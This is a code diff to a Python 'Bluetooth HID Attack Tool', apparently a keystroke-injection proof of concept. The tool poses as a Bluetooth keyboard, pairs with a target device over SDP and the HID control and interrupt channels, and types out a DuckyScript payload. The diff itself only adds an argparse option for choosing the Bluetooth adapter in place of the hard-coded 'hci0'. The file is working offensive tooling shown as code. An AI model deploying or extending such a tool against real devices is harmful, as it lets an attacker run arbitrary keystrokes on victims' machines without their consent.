@@ -1,4 +1,4 @@
-import binascii, bluetooth, sys, time, datetime, logging
+import binascii, bluetooth, sys, time, datetime, logging, argparse
 from multiprocessing import Process
 from pydbus import SystemBus
 from enum import Enum
@@ -594,12 +594,12 @@ def terminate_child_processes():
             proc.terminate()
             proc.join()
 
-def setup_bluetooth(target_address):
+def setup_bluetooth(target_address, adapter_id):
     restart_bluetooth_daemon()
-    profile_proc = Process(target=register_hid_profile, args=('hci0', target_address))
+    profile_proc = Process(target=register_hid_profile, args=(adapter_id, target_address))
     profile_proc.start()
     child_processes.append(profile_proc)
-    adapter = Adapter('hci0')
+    adapter = Adapter(adapter_id)
     adapter.set_property("name", "Robot POC")
     adapter.set_property("class", 0x002540)
     adapter.power(True)
@@ -617,16 +617,21 @@ def establish_connections(connection_manager):
     if not connection_manager.connect_all():
         raise ConnectionFailureException("Failed to connect to all required ports")
 
-def setup_and_connect(connection_manager, target_address):
+def setup_and_connect(connection_manager, target_address, adapter_id):
     connection_manager.create_connection(1)   # SDP
     connection_manager.create_connection(17)  # HID Control
     connection_manager.create_connection(19)  # HID Interrupt
-    initialize_pairing('hci0', target_address)
+    initialize_pairing(adapter_id, target_address)
     establish_connections(connection_manager)
     return connection_manager.clients[19]
 
 # Main function
 def main():
+    parser = argparse.ArgumentParser(description="Bluetooth HID Attack Tool")
+    parser.add_argument('--adapter', type=str, default='hci0', help='Specify the Bluetooth adapter to use (default: hci0)')
+    args = parser.parse_args()
+    adapter_id = args.adapter
+        
     main_menu()
     target_address = get_target_address()
     if not target_address:
@@ -638,7 +643,7 @@ def main():
         log.info("Payload file not found. Exiting.")
         return
 
-    adapter = setup_bluetooth(target_address)
+    adapter = setup_bluetooth(target_address, adapter_id)
     adapter.enable_ssp()
     
     current_line = 0
@@ -647,7 +652,7 @@ def main():
 
     while True:
         try:
-            hid_interrupt_client = setup_and_connect(connection_manager, target_address)
+            hid_interrupt_client = setup_and_connect(connection_manager, target_address, adapter_id)
             process_duckyscript(hid_interrupt_client, duckyscript, current_line, current_position)
             time.sleep(2)
             break  # Exit loop if successful
